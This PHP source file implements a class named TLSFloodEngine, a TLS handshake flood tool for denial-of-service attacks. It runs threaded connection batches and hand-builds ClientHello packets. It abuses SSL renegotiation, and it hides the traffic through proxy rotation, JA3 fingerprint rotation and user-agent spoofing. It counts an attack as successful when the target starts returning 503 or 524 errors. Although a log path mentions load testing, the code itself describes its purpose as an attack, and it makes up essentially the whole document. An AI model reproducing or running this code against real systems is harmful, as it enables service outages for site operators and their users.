<?php

class TLSFloodEngine {
    private $db;
    private $config;
    private $stealthEngine;
    
    public function __construct($database, $config = []) {
        $this->db = $database;
        $this->config = array_merge($this->getDefaultConfig(), $config);
        $this->stealthEngine = null;
    }
    
    public function getDefaultConfig() {
        return [
            'method' => 'TLS_FLOOD',
            'threads' => 100,
            'duration' => 300,
            'connection_rate' => 200,
            'handshake_type' => 'full',
            'tls_version' => '1.3',
            'cipher_exhaustion' => true,
            'stealth_enabled' => true,
            'proxy_rotation' => true,
            'ja3_rotation' => true,
            'connection_reuse' => false,
            'ssl_renegotiation' => true
        ];
    }
    
    public function start($groupId, $targets, $profile) {
        $this->logMessage("Starting TLS-flood attack for group: $groupId");
        
        if ($this->config['stealth_enabled']) {
            $this->initializeStealth($groupId);
        }
        
        $attackResults = [];
        
        foreach ($targets as $target) {
            $targetResult = $this->attackTarget($target, $groupId, $profile);
            $attackResults[] = $targetResult;
        }
        
        return [
            'attack_method' => 'tls-flood',
            'group_id' => $groupId,
            'targets' => count($targets),
            'results' => $attackResults,
            'config' => $this->config
        ];
    }
    
    private function attackTarget($target, $groupId, $profile) {
        $this->logMessage("TLS-flood attack on target: $target");
        
        $startTime = time();
        $endTime = $startTime + $this->config['duration'];
        $connectionCount = 0;
        $successfulHandshakes = 0;
        $failedHandshakes = 0;
        $errorCodes = [];
        
        while (true) {
            if ($this->shouldStop($groupId)) {
                $this->logMessage("Manual stop signal received for group: $groupId");
                break;
            }
            
            if ($this->isSuccessConditionMet($target, $groupId, $errorCodes)) {
                $this->logMessage("Success condition met for target: $target in group: $groupId");
                break;
            }
            
            $batchResults = $this->executeTLSBatch($target, $groupId, $profile);
            
            $connectionCount += $batchResults['connections'];
            $successfulHandshakes += $batchResults['successful_handshakes'];
            $failedHandshakes += $batchResults['failed_handshakes'];
            
            foreach ($batchResults['error_codes'] as $code => $count) {
                $errorCodes[$code] = ($errorCodes[$code] ?? 0) + $count;
            }
            
            if ($this->config['stealth_enabled'] && $connectionCount % 50 === 0) {
                $this->rotateStealthComponents($groupId);
            }
            
            usleep(1000000 / $this->config['connection_rate']);
        }
        
        $duration = time() - $startTime;
        $cps = $duration > 0 ? round($connectionCount / $duration, 2) : 0;
        
        $this->logMessage("TLS-flood completed for $target: $connectionCount connections, $successfulHandshakes successful handshakes, CPS: $cps");
        
        return [
            'target' => $target,
            'duration' => $duration,
            'total_connections' => $connectionCount,
            'successful_handshakes' => $successfulHandshakes,
            'failed_handshakes' => $failedHandshakes,
            'error_codes' => $errorCodes,
            'connections_per_second' => $cps,
            'handshake_success_rate' => $connectionCount > 0 ? round(($successfulHandshakes / $connectionCount) * 100, 2) : 0
        ];
    }
    
    private function executeTLSBatch($target, $groupId, $profile) {
        $batchSize = $this->config['threads'];
        $connections = 0;
        $successfulHandshakes = 0;
        $failedHandshakes = 0;
        $errorCodes = [];
        
        for ($i = 0; $i < $batchSize; $i++) {
            $result = $this->executeTLSConnection($target, $groupId, $profile);
            $connections++;
            
            if ($result['handshake_success']) {
                $successfulHandshakes++;
            } else {
                $failedHandshakes++;
            }
            
            $code = $result['error_code'] ?? 'unknown';
            $errorCodes[$code] = ($errorCodes[$code] ?? 0) + 1;
        }
        
        return [
            'connections' => $connections,
            'successful_handshakes' => $successfulHandshakes,
            'failed_handshakes' => $failedHandshakes,
            'error_codes' => $errorCodes
        ];
    }
    
    private function executeTLSConnection($target, $groupId, $profile) {
        $parsedUrl = parse_url($target);
        $host = $parsedUrl['host'] ?? $target;
        $port = $parsedUrl['port'] ?? 443;
        $scheme = $parsedUrl['scheme'] ?? 'https';
        
        if ($scheme !== 'https') {
            $port = 443;
        }
        
        $proxy = $this->getProxy();
        $tlsConfig = $this->getTLSConfig();
        
        $startTime = microtime(true);
        $handshakeSuccess = false;
        $errorCode = null;
        
        try {
            if ($this->config['handshake_type'] === 'full') {
                $result = $this->performFullTLSHandshake($host, $port, $tlsConfig, $proxy);
            } else {
                $result = $this->performPartialTLSHandshake($host, $port, $tlsConfig, $proxy);
            }
            
            $handshakeSuccess = $result['success'];
            $errorCode = $result['error_code'];
            
        } catch (Exception $e) {
            $errorCode = 'exception';
            $this->logMessage("TLS connection error for $target: " . $e->getMessage());
        }
        
        $responseTime = round((microtime(true) - $startTime) * 1000);
        
        return [
            'handshake_success' => $handshakeSuccess,
            'response_time' => $responseTime,
            'error_code' => $errorCode
        ];
    }
    
    private function performFullTLSHandshake($host, $port, $tlsConfig, $proxy = null) {
        $context = stream_context_create([
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false,
                'allow_self_signed' => true,
                'crypto_method' => $this->getTLSCryptoMethod($tlsConfig['tls_version']),
                'ciphers' => implode(':', $tlsConfig['cipher_suites']),
                'capture_peer_cert' => false,
                'disable_compression' => true,
                'SNI_enabled' => true,
                'peer_name' => $host
            ],
            'http' => [
                'timeout' => 5,
                'user_agent' => $this->getUserAgent()
            ]
        ]);
        
        if ($proxy) {
            $context = stream_context_set_option($context, 'http', 'proxy', "tcp://$proxy");
        }
        
        $connection = @stream_socket_client(
            "ssl://$host:$port",
            $errno,
            $errstr,
            5,
            STREAM_CLIENT_CONNECT,
            $context
        );
        
        if ($connection) {
            if ($this->config['ssl_renegotiation']) {
                $this->performSSLRenegotiation($connection);
            }
            
            fclose($connection);
            return ['success' => true, 'error_code' => '200'];
        }
        
        return ['success' => false, 'error_code' => $errno ?: 'connection_failed'];
    }
    
    private function performPartialTLSHandshake($host, $port, $tlsConfig, $proxy = null) {
        $socket = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        
        if (!$socket) {
            return ['success' => false, 'error_code' => 'socket_create_failed'];
        }
        
        socket_set_option($socket, SOL_SOCKET, SO_RCVTIMEO, ['sec' => 5, 'usec' => 0]);
        socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, ['sec' => 5, 'usec' => 0]);
        
        $connected = @socket_connect($socket, $host, $port);
        
        if ($connected) {
            $clientHello = $this->generateClientHello($host, $tlsConfig);
            $sent = @socket_write($socket, $clientHello);
            
            if ($sent) {
                $response = @socket_read($socket, 1024);
                socket_close($socket);
                
                if ($response && $this->isValidServerHello($response)) {
                    return ['success' => true, 'error_code' => '200'];
                }
            }
        }
        
        socket_close($socket);
        return ['success' => false, 'error_code' => 'handshake_failed'];
    }
    
    private function generateClientHello($host, $tlsConfig) {
        $tlsVersion = $tlsConfig['tls_version'] === '1.3' ? "\x03\x04" : "\x03\x03";
        $random = random_bytes(32);
        $sessionId = '';
        
        $cipherSuites = '';
        foreach ($tlsConfig['cipher_suite_ids'] as $cipherId) {
            $cipherSuites .= pack('n', $cipherId);
        }
        
        $extensions = $this->generateTLSExtensions($host, $tlsConfig);
        
        $handshakeData = 
            $tlsVersion .
            $random .
            chr(strlen($sessionId)) . $sessionId .
            pack('n', strlen($cipherSuites)) . $cipherSuites .
            "\x01\x00" .
            pack('n', strlen($extensions)) . $extensions;
        
        $handshakeHeader = 
            "\x01" .
            substr(pack('N', strlen($handshakeData)), 1) .
            $handshakeData;
        
        $recordHeader = 
            "\x16" .
            $tlsVersion .
            pack('n', strlen($handshakeHeader));
        
        return $recordHeader . $handshakeHeader;
    }
    
    private function generateTLSExtensions($host, $tlsConfig) {
        $extensions = '';
        
        $serverName = "\x00" . pack('n', strlen($host)) . $host;
        $serverNameList = pack('n', strlen($serverName)) . $serverName;
        $extensions .= "\x00\x00" . pack('n', strlen($serverNameList)) . $serverNameList;
        
        $supportedGroups = "\x00\x17\x00\x18\x00\x19";
        $extensions .= "\x00\x0a" . pack('n', strlen($supportedGroups) + 2) . pack('n', strlen($supportedGroups)) . $supportedGroups;
        
        $signatureAlgorithms = "\x04\x03\x05\x03\x06\x03\x08\x07";
        $extensions .= "\x00\x0d" . pack('n', strlen($signatureAlgorithms) + 2) . pack('n', strlen($signatureAlgorithms)) . $signatureAlgorithms;
        
        if ($tlsConfig['tls_version'] === '1.3') {
            $supportedVersions = "\x03\x04";
            $extensions .= "\x00\x2b" . pack('n', strlen($supportedVersions) + 1) . chr(strlen($supportedVersions)) . $supportedVersions;
        }
        
        return $extensions;
    }
    
    private function isValidServerHello($response) {
        if (strlen($response) < 6) {
            return false;
        }
        
        $recordType = ord($response[0]);
        $handshakeType = ord($response[5]);
        
        return $recordType === 0x16 && $handshakeType === 0x02;
    }
    
    private function performSSLRenegotiation($connection) {
        if (!$connection) {
            return;
        }
        
        $renegotiationRequest = "\x16\x03\x03\x00\x04\x0e\x00\x00\x00";
        @fwrite($connection, $renegotiationRequest);
        
        usleep(100000);
    }
    
    private function getTLSConfig() {
        if (!$this->config['ja3_rotation']) {
            return $this->getDefaultTLSConfig();
        }
        
        $configs = [
            [
                'tls_version' => '1.3',
                'cipher_suites' => ['TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384'],
                'cipher_suite_ids' => [0x1301, 0x1302]
            ],
            [
                'tls_version' => '1.2',
                'cipher_suites' => ['TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256', 'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384'],
                'cipher_suite_ids' => [0xc02f, 0xc030]
            ]
        ];
        
        return $configs[array_rand($configs)];
    }
    
    private function getDefaultTLSConfig() {
        return [
            'tls_version' => $this->config['tls_version'],
            'cipher_suites' => ['TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256'],
            'cipher_suite_ids' => [0x1301, 0x1302, 0x1303]
        ];
    }
    
    private function getTLSCryptoMethod($tlsVersion) {
        switch ($tlsVersion) {
            case '1.3':
                return STREAM_CRYPTO_METHOD_TLSv1_3_CLIENT;
            case '1.2':
                return STREAM_CRYPTO_METHOD_TLSv1_2_CLIENT;
            case '1.1':
                return STREAM_CRYPTO_METHOD_TLSv1_1_CLIENT;
            default:
                return STREAM_CRYPTO_METHOD_TLS_CLIENT;
        }
    }
    
    private function getUserAgent() {
        $userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0'
        ];
        
        return $userAgents[array_rand($userAgents)];
    }
    
    private function getProxy() {
        if (!$this->config['proxy_rotation'] || !$this->db) {
            return null;
        }
        
        $proxies = $this->db->getActiveProxies(1);
        if (!empty($proxies)) {
            $proxy = $proxies[0];
            return $proxy['ip_address'] . ':' . $proxy['port'];
        }
        
        return null;
    }
    
    private function initializeStealth($groupId) {
        $this->logMessage("Initializing stealth components for TLS-flood group: $groupId");
        $this->stealthEngine = true;
    }
    
    private function rotateStealthComponents($groupId) {
        if (!$this->stealthEngine) {
            return;
        }
        
        $this->logMessage("Rotating TLS fingerprints for group: $groupId");
    }
    
    private function shouldStop($groupId) {
        $stopFile = "/tmp/stop_signal_$groupId.flag";
        return file_exists($stopFile);
    }
    
    private function isSuccessConditionMet($target, $groupId, $errorCodes) {
        if (empty($errorCodes)) return false;
        
        $totalRequests = array_sum($errorCodes);
        if ($totalRequests < 100) return false;
        
        $successCodes = [404, 410, 503, 524];
        $successCount = 0;
        
        foreach ($successCodes as $code) {
            $successCount += $errorCodes[$code] ?? 0;
        }
        
        $successRate = $successCount / $totalRequests;
        
        if ($successRate >= 0.75) {
            $statusFile = "/tmp/success_status_$groupId.json";
            $status = [
                'target' => $target,
                'success_rate' => $successRate,
                'total_requests' => $totalRequests,
                'success_count' => $successCount,
                'timestamp' => time(),
                'condition_met' => true
            ];
            file_put_contents($statusFile, json_encode($status));
            return true;
        }
        
        return false;
    }
    
    private function logMessage($message) {
        $logFile = '/home/ftcceelg/load_testing_system/logs/backend.log';
        $logDir = dirname($logFile);
        if (!is_dir($logDir)) {
            mkdir($logDir, 0755, true);
        }
        $timestamp = date('Y-m-d H:i:s');
        file_put_contents($logFile, "[$timestamp] TLS_FLOOD: $message\n", FILE_APPEND | LOCK_EX);
    }
}
?>
